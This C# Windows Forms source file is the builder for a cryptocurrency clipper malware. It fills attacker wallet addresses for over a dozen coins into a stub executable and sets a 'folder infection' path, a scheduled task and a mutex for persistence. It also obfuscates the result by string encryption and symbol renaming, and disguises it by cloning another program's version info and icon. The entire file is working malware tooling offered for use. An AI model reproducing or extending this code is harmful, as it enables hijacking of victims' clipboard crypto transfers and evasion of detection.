using System;
using System.Linq;
using System.Windows.Forms;
using dnlib.DotNet;
using System.IO;
using dnlib.DotNet.Emit;
using Stub.Help;
using System.Diagnostics;
using Toolbelt.Drawing;
using Vestris.ResourceLib;
using System.Threading.Tasks;
using Builder.RenamingObfuscation;

namespace Builder
{
    public partial class Form1 : Form
    {
        public Form1(string fileName)
        {
            InitializeComponent();
        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = txtFileVersion.Text;
                versionResource.ProductVersion = txtProductVersion.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txtProduct.Text;
                stringFileInfo["FileDescription"] = txtDescription.Text;
                stringFileInfo["CompanyName"] = txtCompany.Text;
                stringFileInfo["LegalCopyright"] = txtCopyright.Text;
                stringFileInfo["LegalTrademarks"] = txtTrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txtOriginalFilename.Text;
                stringFileInfo["OriginalFilename"] = txtOriginalFilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }
        private async void button1_Click(object sender, EventArgs e)
        {
            try
            {
                string btc = "";
                foreach (string item in textBox1_BTC.Text.Split('\n'))
                {
                    btc += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.BTC = btc.Remove(btc.Length - 1);
            }
            catch { }

            try
            {
                string BTC_bc1 = "";
                foreach (string item in textBox2.Text.Split('\n'))
                {
                    BTC_bc1 += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.BTC_bc1 = BTC_bc1.Remove(BTC_bc1.Length - 1);
            }
            catch { }

            //

            try
            {
                string BCH = "";
            foreach (string item in textBox6.Text.Split('\n'))
            {
                BCH += item.Trim() + ",".Trim();
            }
                Properties.Settings.Default.BCH = BCH.Remove(BCH.Length - 1);
            }
            catch { }

            try
            {
                string DOGE = "";
                foreach (string item in textBox7.Text.Split('\n'))
                {
                    DOGE += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.DOGE = DOGE.Remove(DOGE.Length - 1);
            }
            catch { }

            try
            {
                string ETH = "";
                foreach (string item in textBox5.Text.Split('\n'))
                {
                    ETH += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.ETH = ETH.Remove(ETH.Length - 1);
            }
            catch { }

            try
            {
                string LTC = "";
                foreach (string item in textBox8.Text.Split('\n'))
                {
                    LTC += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.LTC = LTC.Remove(LTC.Length - 1);
            }
            catch { }

            try
            {
                string XMR = "";
                foreach (string item in textBox9.Text.Split('\n'))
                {
                    XMR += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.XMR = XMR.Remove(XMR.Length - 1);
            }
            catch { }

            try
            {
                string xlm = "";
                foreach (string item in textBox10.Text.Split('\n'))
                {
                    xlm += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.xlm = xlm.Remove(xlm.Length - 1);
            }
            catch { }

            try
            {
                string xrp = "";
                foreach (string item in textBox11.Text.Split('\n'))
                {
                    xrp += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.xrp = xrp.Remove(xrp.Length - 1);
            }
            catch { }

            try
            {
                string nec = "";
                foreach (string item in textBox12.Text.Split('\n'))
                {
                    nec += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.nec = nec.Remove(nec.Length - 1);
            }
            catch { }

            try
            {
                string dash = "";
                foreach (string item in textBox13.Text.Split('\n'))
                {
                    dash += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.dash = dash.Remove(dash.Length - 1);
            }
            catch { }

            try
            {
                string trx = "";
                foreach (string item in textBox14.Text.Split('\n'))
                {
                    trx += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.trx = trx.Remove(trx.Length - 1);
            }
            catch { }

            try
            {
                string zcash = "";
                foreach (string item in textBox15.Text.Split('\n'))
                {
                    zcash += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.zcash = zcash.Remove(zcash.Length - 1);
            }
            catch { }

            try
            {
                string bnb = "";
                foreach (string item in textBox20.Text.Split('\n'))
                {
                    bnb += item.Trim() + ",".Trim();
                }
                Properties.Settings.Default.bnb = bnb.Remove(bnb.Length - 1);
            }
            catch { }

            Properties.Settings.Default.DIR = textBox16.Text;
            Properties.Settings.Default.EXE = textBox17.Text;
            Properties.Settings.Default.TASKNAME = textBox19.Text;
            Properties.Settings.Default.MUTEX = textBox4.Text;
            Properties.Settings.Default.Save();

            ModuleDefMD asmDef = null;
            try
            {
                using (asmDef = ModuleDefMD.Load(@"stub\Stub.exe"))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = true;
                    saveFileDialog1.FileName = "ClipperBuild";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        WriteSettingsPeresentation(asmDef, saveFileDialog1.FileName);
                         EncryptString.DoEncrypt(asmDef);
                        await Task.Run(() =>
                        {
                            Renaming.DoRenaming(asmDef);
                        });

                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();

                        if (btnAssembly.Checked)
                        {
                            WriteAssembly(saveFileDialog1.FileName);
                        }
                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                        {
                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
                        }
                        Form1 formBuilt = new Form1(saveFileDialog1.FileName);
                        MessageBox.Show("OK: " + saveFileDialog1.FileName, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }

                    
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
            }
        }

        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Config")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    // Install
                                    if (method.Body.Instructions[i].Operand.ToString() == "%DIR%")
                                        method.Body.Instructions[i].Operand = textBox16.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%EXE%")
                                        method.Body.Instructions[i].Operand = textBox17.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%TASKNAME%")
                                        method.Body.Instructions[i].Operand = textBox19.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%MUTEX%")
                                        method.Body.Instructions[i].Operand = textBox4.Text;

                                    // Wallets
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.BTC;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BCH%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.BCH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%DOGE%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.DOGE;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%ETH%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.ETH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%LTC%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.LTC;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%XMR%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.XMR;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xlm%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xrp%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%nec%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%dash%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%trx%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%zcash%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%bnb%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC_BC1%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.BTC_bc1;
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {
            textBox4.Text = Methods.GetRandomString(32);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (Properties.Langiage.Default.lang == "en")
            {
                tabPage14.Text = "Build";
                label4.Text = "Folder Infection";
                label8.Text = "Task Name";
                button2.Text = "Random.";
                button1.Text = "Build";
                groupBox4.Text = "File Info";
                btnAssembly.Text = "Enable";
                btnClone.Text = "Clone from another exe or dll";
                groupBox5.Text = "exe Icon";
                chkIcon.Text =  "Enable";
                btnIcon.Text = "Select icon *.ico";
                toolStripDropDownButton1.Image = Properties.Resources.usa;
            }



            textBox16.Text = Properties.Settings.Default.DIR;
            textBox17.Text = Properties.Settings.Default.EXE;
            textBox19.Text = Properties.Settings.Default.TASKNAME;
            textBox4.Text = Properties.Settings.Default.MUTEX;

            try
            {
                string BTC = "";
                foreach (string item in Properties.Settings.Default.BTC.Split(','))
                {
                    BTC += item + Environment.NewLine;
                }
                textBox1_BTC.Text = BTC.Remove(BTC.Length - 1);
                    
                
            }
            catch { }

            try
            {
                
                string BCH = "";
                foreach (string item in Properties.Settings.Default.BCH.Split(','))
                {
                    BCH += item + Environment.NewLine;
                }
                textBox6.Text = BCH.Remove(BCH.Length - 1);
            }
            catch { }

            try
            {
                
                string DOGE = "";
                foreach (string item in Properties.Settings.Default.DOGE.Split(','))
                {
                    DOGE += item + Environment.NewLine;
                }
                textBox7.Text = DOGE.Remove(DOGE.Length - 1);
            }
            catch { }

            try
            {
                
                string ETH = "";
                foreach (string item in Properties.Settings.Default.ETH.Split(','))
                {
                    ETH += item + Environment.NewLine;
                }
                textBox5.Text = ETH.Remove(ETH.Length - 1);
            }
            catch { }

            try
            {
                
                string LTC = "";
                foreach (string item in Properties.Settings.Default.LTC.Split(','))
                {
                    LTC += item + Environment.NewLine;
                }
                textBox8.Text = LTC.Remove(LTC.Length - 1);
            }
            catch { }

            try
            {
                
                string XMR = "";
                foreach (string item in Properties.Settings.Default.XMR.Split(','))
                {
                    XMR += item + Environment.NewLine;
                }
                textBox9.Text = XMR.Remove(XMR.Length - 1);
            }
            catch { }

            try
            {
                
                string xlm = "";
                foreach (string item in Properties.Settings.Default.xlm.Split(','))
                {
                    xlm += item + Environment.NewLine;
                }
                textBox10.Text = xlm.Remove(xlm.Length - 1);
            }
            catch { }

            try
            {
                
                string xrp = "";
                foreach (string item in Properties.Settings.Default.xrp.Split(','))
                {
                    xrp += item + Environment.NewLine;
                }
                textBox11.Text = xrp.Remove(xrp.Length - 1);
            }
            catch { }

            try
            {
                
                string nec = "";
                foreach (string item in Properties.Settings.Default.nec.Split(','))
                {
                    nec += item + Environment.NewLine;
                }
                textBox12.Text = nec.Remove(nec.Length - 1);
            }
            catch { }

            try
            {
                
                string dash = "";
                foreach (string item in Properties.Settings.Default.dash.Split(','))
                {
                    dash += item + Environment.NewLine;
                }
                textBox13.Text = dash.Remove(dash.Length - 1);
            }
            catch { }

            try
            {
                
                string trx = "";
                foreach (string item in Properties.Settings.Default.trx.Split(','))
                {
                    trx += item + Environment.NewLine;
                }
                textBox14.Text = trx.Remove(trx.Length - 1);
            }
            catch { }

            try
            {
                
                string zcash = "";
                foreach (string item in Properties.Settings.Default.zcash.Split(','))
                {
                    zcash += item + Environment.NewLine;
                }
                textBox15.Text = zcash.Remove(zcash.Length - 1);
            }
            catch { }

            try
            {
                
                string bnb = "";
                foreach (string item in Properties.Settings.Default.bnb.Split(','))
                {
                    bnb += item + Environment.NewLine;
                }
                textBox20.Text = bnb.Remove(bnb.Length - 1);
            }
            catch { }

            try
            {

                string BTC_bc1 = "";
                foreach (string item in Properties.Settings.Default.BTC_bc1.Split(','))
                {
                    BTC_bc1 += item + Environment.NewLine;
                }
                textBox2.Text = BTC_bc1.Remove(BTC_bc1.Length - 1);
            }
            catch { }

            textBox4.Text = Properties.Settings.Default.MUTEX;
        }

        private void timer1_save_settings_Tick(object sender, EventArgs e)
        {
            
        }

        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void BtnIcon_Click(object sender, EventArgs e)
        {

        }

        private void WriteSettingsPeresentation(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Cfgnative")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.BTC;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BCH%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.BCH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%DOGE%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.DOGE;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%ETH%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.ETH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%LTC%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.LTC;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%XMR%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.XMR;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xlm%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xrp%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%nec%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%dash%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%trx%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%zcash%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%bnb%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC_BC1%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.BTC_bc1;
                                }
                            }
                        }
                }
            }
            catch
            {
            }
        }

        private void btnAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (btnAssembly.Checked)
            {
                btnClone.Enabled = true;
                txtProduct.Enabled = true;
                txtDescription.Enabled = true;
                txtCompany.Enabled = true;
                txtCopyright.Enabled = true;
                txtTrademarks.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtProductVersion.Enabled = true;
                txtFileVersion.Enabled = true;
            }
            else
            {
                btnClone.Enabled = false;
                txtProduct.Enabled = false;
                txtDescription.Enabled = false;
                txtCompany.Enabled = false;
                txtCopyright.Enabled = false;
                txtTrademarks.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtProductVersion.Enabled = false;
                txtFileVersion.Enabled = false;
            }
        }

        private void btnClone_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtOriginalFilename.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    txtFileVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    txtProductVersion.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }

        private void chkIcon_CheckedChanged_1(object sender, EventArgs e)
        {
            if (chkIcon.Checked)
            {
                txtIcon.Enabled = true;
                btnIcon.Enabled = true;
            }
            else
            {
                txtIcon.Enabled = false;
                btnIcon.Enabled = false;
            }
        }

        private string GetIcon(string path)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".ico";
                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFile;
            }
            catch { }
            return "";
        }
        private void btnIcon_Click_1(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        string ico = GetIcon(ofd.FileName);
                        txtIcon.Text = ico;
                        picIcon.ImageLocation = ico;
                    }
                    else
                    {
                        txtIcon.Text = ofd.FileName;
                        picIcon.ImageLocation = ofd.FileName;
                    }
                }
            }
        }

        private void toolStripLabel1_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/devxstudio");
        }

        private void englishToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
                tabPage14.Text = "Build";
                label4.Text = "Folder Infection";
                label8.Text = "Task Name";
                button2.Text = "Random.";
                button1.Text = "Build";
                groupBox4.Text = "File Info";
                btnAssembly.Text = "Enable";
                btnClone.Text = "Clone from another exe or dll";
                groupBox5.Text = "exe Icon";
                chkIcon.Text = "Enable";
                btnIcon.Text = "Select icon *.ico";
                toolStripDropDownButton1.Image = Properties.Resources.usa;
            
        }

        private void russianToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
                tabPage14.Text = "Создать";
                label4.Text = "Путь заражения";
                label8.Text = "Имя задачи";
                button2.Text = "Рандом";
                button1.Text = "Создать";
                groupBox4.Text = "Информация о файле";
                btnAssembly.Text = "Использовать";
                btnClone.Text = "Клонировать с другого exe или dll";
                groupBox5.Text = "Иконка";
                chkIcon.Text = "Использовать";
                btnIcon.Text = "Выбрать иконку *.ico";
                toolStripDropDownButton1.Image = Properties.Resources.russia;
            
        }
    }
}
